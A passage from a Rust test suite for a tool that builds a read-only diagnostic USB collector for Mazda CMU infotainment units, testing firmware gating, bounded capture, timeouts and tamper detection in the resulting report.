            validate_macos_volume_plists(&fat16, mbr),
            Err(PrepareError::DestinationNotFat32)
        ));
        let fixed = volume.replace("<true/>", "<false/>");
        assert!(matches!(
            validate_macos_volume_plists(&fixed, mbr),
            Err(PrepareError::DestinationNotRemovable)
        ));
        let guid = mbr.replace("FDisk_partition_scheme", "GUID_partition_scheme");
        assert!(matches!(
            validate_macos_volume_plists(volume, &guid),
            Err(PrepareError::DestinationNotMbr)
        ));
    }

    #[test]
    fn refuses_unconfirmed_firmware_before_writing() {
        let usb = TestDirectory::new("firmware");

        let result = prepare_usb(&usb.0, "70.00.100A", CmuMount::Sda1);

        assert!(matches!(result, Err(PrepareError::UnsupportedFirmware)));
        assert_eq!(fs::read_dir(&usb.0).expect("list USB").count(), 0);
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_is_firmware_gated_bounded_and_usb_only() {
        let usb = TestDirectory::new("collector-usb");
        let root = TestDirectory::new("collector-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\r\nJCI_SW_VER_PATCH=\"A\"\r\n",
        );
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");
        root.write("proc/version", b"Linux fixture\n");
        root.write("proc/cpuinfo", &vec![b'x'; 256 * 1024 + 4096]);
        root.write(
            "lib/modules/3.0.35/kernel/drivers/net/usb/asix.ko",
            b"fixture module",
        );
        root.write(
            "lib/modules/9.9.9/kernel/drivers/net/usb/cdc_ncm.ko",
            b"stale fixture module",
        );
        root.write(
            "lib/modules/3.0.35/kernel/drivers/net/usb/unrelated.ko",
            b"unrelated fixture module",
        );
        root.write(
            "proc/net/dev",
            b"Inter-| Receive | Transmit\n  lo: 0 0\neth0: 1 2\ncan0: 3 4\n",
        );
        root.write("persistent/sentinel", b"unchanged");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(output.status.success());
        assert!(output.stdout.is_empty());
        assert!(output.stderr.is_empty());
        let report = usb.0.join("mazda-cmu-report");
        assert_eq!(
            fs::read(report.join("kernel-version.txt")).expect("read captured kernel"),
            b"Linux fixture\n"
        );
        assert_eq!(
            fs::metadata(report.join("cpuinfo.txt"))
                .expect("stat captured CPU info")
                .len(),
            256 * 1024
        );
        let manifest = fs::read_to_string(report.join("manifest.tsv")).expect("read manifest");
        assert!(manifest.contains("proc/cpuinfo\ttruncated\t262144\t"));
        assert_eq!(
            fs::read_to_string(report.join("sync-complete")).expect("read sync marker"),
            format!("{REPORT_BUILD_ID}\n")
        );
        assert_eq!(
            fs::read_to_string(report.join("usb-network-modules.txt"))
                .expect("read USB network modules"),
            "lib/modules/3.0.35/kernel/drivers/net/usb/asix.ko\n"
        );
        let analysis = analyze_report(&report).expect("analyze report");
        assert_eq!(analysis.firmware, SUPPORTED_FIRMWARE);
        assert_eq!(
            analysis.available_usb_network_drivers,
            [UsbNetworkDriver::Asix]
        );
        assert_eq!(analysis.observed_interfaces, ["can0", "eth0", "lo"]);
        assert_eq!(
            fs::read(root.0.join("persistent/sentinel")).expect("read sentinel"),
            b"unchanged"
        );
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_refuses_other_firmware_without_creating_report() {
        let usb = TestDirectory::new("refusal-usb");
        let root = TestDirectory::new("refusal-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        root.write("jci/version.ini", b"JCI_SW_VER=\"cmu150_NA_74.00.331\"\n");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(!output.status.success());
        assert!(!usb.0.join("mazda-cmu-report").exists());
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_refuses_wrong_patch_without_creating_report() {
        let usb = TestDirectory::new("patch-refusal-usb");
        let root = TestDirectory::new("patch-refusal-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\nJCI_SW_VER_PATCH=\"B\"\n",
        );

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(!output.status.success());
        assert!(!usb.0.join("mazda-cmu-report").exists());
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_records_timeouts_without_leaving_partial_files() {
        let usb = TestDirectory::new("timeout-usb");
        let root = TestDirectory::new("timeout-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\nJCI_SW_VER_PATCH=\"A\"\n",
        );
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .env("MAZDA_CMU_INSPECT_TEST_TIMEOUT_SECONDS", "0.000001")
            .output()
            .expect("run collector");

        assert!(output.status.success());
        let report = usb.0.join("mazda-cmu-report");
        let manifest = fs::read_to_string(report.join("manifest.tsv")).expect("read manifest");
        assert!(manifest.contains("\ttimeout\t0\t-\t-\n"));
        assert!(fs::read_dir(&report)
            .expect("list report")
            .all(|entry| !entry
                .expect("read report entry")
                .file_name()
                .to_string_lossy()
                .starts_with('.')));
        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::ObservationFailed {
                status: "timeout",
                ..
            })
        ));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn analyzer_refuses_incomplete_report() {
        let usb = TestDirectory::new("incomplete-usb");
        let root = TestDirectory::new("incomplete-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\nJCI_SW_VER_PATCH=\"A\"\n",
        );
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");
        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");
        assert!(output.status.success());
        let report = usb.0.join("mazda-cmu-report");
        fs::remove_file(report.join("sync-complete")).expect("remove completion marker");

        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::IncompleteReport)
        ));
    }

    #[test]
    fn posix_checksum_matches_cksum_utility() {
        assert_eq!(posix_cksum(b""), 4_294_967_295);
        assert_eq!(posix_cksum(b"abc"), 1_219_131_554);
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn analyzer_rejects_tampering_duplicate_rows_and_extra_files() {
        let usb = TestDirectory::new("tamper-usb");
        let root = TestDirectory::new("tamper-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\nJCI_SW_VER_PATCH=\"A\"\n",
        );
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");
        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");
        assert!(output.status.success());
        let report = usb.0.join("mazda-cmu-report");
        let original_firmware = fs::read(report.join("firmware-version.ini"))
            .expect("read original firmware observation");
        let original_manifest =
            fs::read_to_string(report.join("manifest.tsv")).expect("read original manifest");
        fs::write(report.join("firmware-version.ini"), b"changed\n")
            .expect("tamper with observation");

        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::ChecksumMismatch("firmware-version.ini"))
        ));

        fs::write(report.join("firmware-version.ini"), original_firmware)
            .expect("restore firmware observation");
        let mut manifest_lines = original_manifest.lines().collect::<Vec<_>>();
        manifest_lines.insert(4, manifest_lines[3]);
        fs::write(
            report.join("manifest.tsv"),
            format!("{}\n", manifest_lines.join("\n")),
        )
        .expect("duplicate manifest row");
        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::InvalidObservation(
                "proc/sys/kernel/osrelease"
            ))
        ));

        fs::write(report.join("manifest.tsv"), original_manifest).expect("restore manifest");
        fs::write(report.join("unexpected.up"), b"unexpected").expect("write extra file");
        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::UnexpectedFile(name)) if name == "unexpected.up"
        ));
    }
}
